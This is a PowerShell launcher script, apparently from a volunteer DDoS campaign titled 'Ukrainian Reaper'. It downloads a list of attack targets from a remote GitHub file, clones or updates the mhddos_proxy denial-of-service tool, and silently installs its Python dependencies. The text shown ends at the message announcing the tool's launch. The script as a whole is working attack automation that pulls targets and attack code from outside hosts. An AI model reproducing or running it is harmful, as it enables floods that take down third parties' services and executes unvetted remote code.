[CmdletBinding()]
param()

$ErrorActionPreference = 'Stop'
Clear-Host
# Will be necessary for Windows 7 adaptation
If ($PSVersionTable.PSVersion.Major -lt 3) {
    $PsScriptRoot = Split-Path $MyInvocation.MyCommand.Path 
}
. $PsScriptRoot\functions.ps1

$LogoTxt = Get-Content -Path "$PsScriptRoot\Logo.txt"
$LogoSize = $LogoTxt.Length
for ($i=0; $i -lt $LogoSize; $i++ ) {
    $fgColor = $i -lt ( $LogoSize/2) ? "Blue" : "Yellow"
    Write-MidleHost $LogoTxt[$i] -ForegroundColor $fgColor -BackgroundColor 'Black'
}
Write-MidleHost "УКРАЇНСЬКИЙ ЖНЕЦЬ"
Write-MidleHost "Powershell v.$($PSVersionTable.PSVersion)" -ForegroundColor 'Green'
Write-Host ""

# get targets
Write-MidleHost "Завантаження цілей" -NoNewline
$TargetsSrc = "https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"
$TargetsList = ( Download-String -SourceUrl $TargetsSrc ) -split "\n" | 
    Where-Object { ( $_ -notlike '#*' ) -or ($_ -like 'http*') -or ($_ -like 'tcp://*') } |
    Foreach-Object {$_ -split " "} | Sort-Object -Unique

# create target files with 360 entries or less
$TargetNumber = $TargetsList.Length
$TargetsList > "$RootPath\tmp\xaa.uaripper"
Write-MidleHost "Знайдено $TargetNumber цілей" -Here
$TargetsList = $null

Write-MidleHost "Завантаження mhddos_proxy" -NoNewline
$RemoteMhddosProxy = 'https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git'
if (Test-Path -Path $LocalMhddosProxy) {
    &"$RootPath\Git\cmd\git.exe" -C $LocalMhddosProxy pull --quiet >nul 2>&1
    $message = "mhddos_proxy було оновлено!"
}
else {
    &"$RootPath\Git\cmd\git.exe" clone "$RemoteMhddosProxy" "$LocalMhddosProxy" --quiet >nul 2>&1
    $message = "mhddos_proxy було встановлено!"
}
Write-MidleHost $message -Here -NoNewline

Write-MidleHost "Створення і активація віртуального оточення" -Here -NoNewline
&"$PyPath\python.exe" -m virtualenv $VenvPath --quiet
&"$VenvPath\Scripts\activate.ps1" >nul 2>&1

Write-MidleHost "Завантаження додаткових компонентів mhddos_proxy" -Here -NoNewline
&"$PyPath\python.exe" -m pip install -r "$LocalMhddosProxy\requirements.txt" --quiet >nul 2>&1
Write-MidleHost "Запуск mhddos_proxy" -Here -NoNewline